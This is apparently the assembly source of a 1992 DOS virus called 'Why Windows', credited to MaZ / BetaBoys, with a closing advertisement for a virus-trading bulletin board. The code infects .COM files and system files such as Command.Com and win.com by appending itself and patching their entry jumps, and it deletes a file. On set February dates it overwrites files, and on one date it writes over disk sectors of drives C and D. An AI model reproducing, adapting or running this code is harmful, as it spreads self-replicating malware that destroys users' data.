seg_a		segment	byte public
		assume	cs:seg_a, ds:seg_a


		org	100h

ww		proc	far

start:
		jmp	loc_2
		db	12 dup (90h)
		db	0CDh, 20h
loc_2:
		jmp	short loc_3
		db	 90h, 2Ah, 2Eh, 63h, 6Fh, 6Dh
		db	 00h, 00h
data_8		db	'C:\Command.Com', 0
		db	'C:\Autoexec.Bat', 0
		db	'C:\Config.Sys', 0
		db	'\win'
data_12         dw      6F64h
		db	'ws\win.com'
		db	 00h,0E9h, 0Eh, 00h, 90h,0C8h
		db	 01h
loc_3:
		mov	bx,101h
		mov	ah,[bx]
		mov	bx,102h
		mov	al,[bx]
		xchg	al,ah
		add	ax,3
		mov	si,ax
		mov	ah,1Ah
		lea	dx,[si+2C8h]
		add	dx,6
                int     21h

                mov     ah,4Eh
		lea	dx,[si+103h]
		mov	cx,6
                int     21h

		cmp	ax,12h
		je	loc_7
		lea	dx,[si+10Ah]
		jmp	short loc_6
		db	90h
loc_5:
                mov     ah,4Dh
                int     21h

                mov     ah,4Fh
                int     21h

		cmp	ax,12h
		je	loc_7
		lea	dx,[si+2C8h]
		add	dx,24h
loc_6:
                mov     ah,3Dh
		mov	al,2
                int     21h

		mov	bx,ax
                mov     ah,42h
		mov	al,2
		mov	dx,0
		mov	cx,0
                int     21h


		push	ax
		sub	ax,6
		mov	dx,ax
                mov     ah,42h
		mov	al,0
		mov	cx,0
                int     21h


                mov     ah,3Fh
		mov	cx,1
		lea	dx,[si+14Bh]
                int     21h


		mov	ah,byte ptr data_8+30h[si]
                cmp     ah,42h
		jne	loc_8
		jmp	short loc_5
loc_7:
		jmp	short loc_9
		db	90h
loc_8:
                mov     ah,42h
		mov	al,0
		mov	dx,0
		mov	cx,0
                int     21h


		mov	ax,3F00h
		mov	cx,3
		lea	dx,[si+2C8h]
		add	dx,3
                int     21h


		mov	ax,4200h
		mov	dx,0
		mov	cx,0
                int     21h


		pop	ax
		sub	ax,3
		mov	byte ptr data_8+2Eh[si],al
		mov	byte ptr data_8+2Fh[si],ah
                mov     ah,40h
		mov	cx,3
		lea	dx,[si+148h]
                int     21h


		mov	ax,4202h
		mov	dx,0
		mov	cx,0
                int     21h


                mov     ah,40h
		lea	dx,[si+100h]
		mov	cx,data_12[si]
                int     21h


		mov	ax,4000h
		lea	dx,[si+2C8h]
		add	dx,3
		mov	cx,3
                int     21h


		jmp	short loc_9
		db	90h
loc_9:
                mov     ah,3Eh
                int     21h

                mov     ah,41h
		lea	dx,[si+137h]
                int     21h

                mov     ah,2Ah
                int     21h


		cmp	dh,2
		jne	loc_14
		cmp	dl,17h
		je	loc_10
		cmp	dl,18h
		je	loc_11
		cmp	dl,19h
		je	loc_12
		jmp	short loc_14
		db	90h
loc_10:
                mov     ah,3Ch
		lea	dx,[si+119h]
		mov	cx,1
                int     21h

		jmp	short loc_14
		db	90h
loc_11:
                mov     ah,3Ch
		lea	dx,[si+129h]
		mov	cx,1
                int     21h

		jmp	short loc_14
		db	90h
loc_12:
		mov	al,2
loc_13:
		mov	cx,96h
		mov	dx,0
		int	26h



		inc	al
		cmp	al,4
		jne	loc_13
loc_14:
		mov	cx,3
		lea	ax,[si+2C8h]
		mov	si,ax
		mov	di,100h
		rep	movsb
		call	sub_1
		int	20h

ww		endp

sub_1		proc	near
		mov	di,offset start
                jmp     di
		db	'Why Windows '
copyright	db	'(c)1992 MaZ / BetaBoys B.B'
		db	 90h, 90h, 90h
sub_1		endp


seg_a		ends



                end     start

;  컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
;  컴컴컴컴컴컴컴컴컴컴> and Remember Don't Forget to Call <컴컴컴컴컴컴컴컴
;  컴컴컴컴컴컴> ARRESTED DEVELOPMENT +31.79.426o79 H/P/A/V/AV/? <컴컴컴컴컴
;  컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
